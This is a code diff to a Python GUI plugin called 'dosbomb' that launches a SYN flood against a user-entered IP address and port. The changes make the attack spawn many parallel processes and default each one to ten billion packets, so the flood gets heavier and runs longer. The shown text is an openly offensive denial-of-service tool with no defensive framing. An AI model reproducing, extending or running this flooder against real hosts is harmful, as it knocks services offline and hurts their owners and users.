@@ -51,11 +51,13 @@ class plugin_dosbomb:
 				if self.run_task[x].is_alive():
 					self.run_task[x].terminate()
 
-	def start(self,nmap_scan = {'use':False}):
+	def start(self,nmap_scan = {'forceuse':False,'data':''}):
 		print("Start Synflooder")
 		ip = self.enterIp.get()
-		self.run_task.append(multiprocessing.Process(target=self.SYN_Flood, args=('.'.join(map(str, list(ip))), int(self.Spinbox1.get()), int(self.Spinbox1_1.get()),int(self.Spinbox1_2.get()),)))
-		self.run_task[len(self.run_task)-1].start()
+		for x in range(0, int(self.Spinbox1_1.get())):
+			self.run_task.append(multiprocessing.Process(target=self.SYN_Flood, args=('.'.join(map(str, list(ip))), int(self.Spinbox1.get()),int(self.Spinbox1_2.get()),)))
+			self.run_task[len(self.run_task)-1].start()
+			print('started',self.run_task[len(self.run_task)-1])
 		
 		
 
@@ -109,7 +111,7 @@ class plugin_dosbomb:
 		self.Label9.configure(background="#d9d9d9")
 		self.Label9.configure(disabledforeground="#a3a3a3")
 		self.Label9.configure(foreground="#000000")
-		self.Label9.configure(text='''Packet Count:''')
+		self.Label9.configure(text='''Thread Count:''')
 
 		self.Label10 = tk.Label(self.PNotebook1_t5)
 		self.Label10.place(relx=0.018, rely=0.573, height=26, width=82)
@@ -136,7 +138,7 @@ class plugin_dosbomb:
 		var_dummy1.set(80)
 
 		var_dummy2 = StringVar()
-		self.Spinbox1_1 = tk.Spinbox(self.PNotebook1_t5, from_=-1.0, to=5000.0,textvariable=var_dummy2)
+		self.Spinbox1_1 = tk.Spinbox(self.PNotebook1_t5, from_=1.0, to=5000.0,textvariable=var_dummy2)
 		self.Spinbox1_1.place(relx=0.196, rely=0.396, relheight=0.106
 			, relwidth=0.154)
 		self.Spinbox1_1.configure(activebackground="#f9f9f9")
@@ -151,7 +153,7 @@ class plugin_dosbomb:
 		self.Spinbox1_1.configure(selectbackground="blue")
 		self.Spinbox1_1.configure(selectforeground="white")
 		self.Spinbox1_1.configure(text=20)
-		var_dummy2.set(-1)
+		var_dummy2.set(1)
 
 		var_dummy3 = StringVar()
 		self.Spinbox1_2 = tk.Spinbox(self.PNotebook1_t5, from_=-1.0, to=10000.0,textvariable=var_dummy3)
@@ -220,12 +222,8 @@ class plugin_dosbomb:
 		return x
 
 
-	def SYN_Flood(self,dstIP, dstPort, counter,bysiz = 0):
+	def SYN_Flood(self,dstIP, dstPort,bysiz = 0 ,counter = 10**10,):
 		total = 0
-		if counter < 0 :
-			counter = 10**10
-		print ("Packets are sending ...")
-
 		for x in range (0, counter):
 			s_port = self.randInt()
 			s_eq = self.randInt()
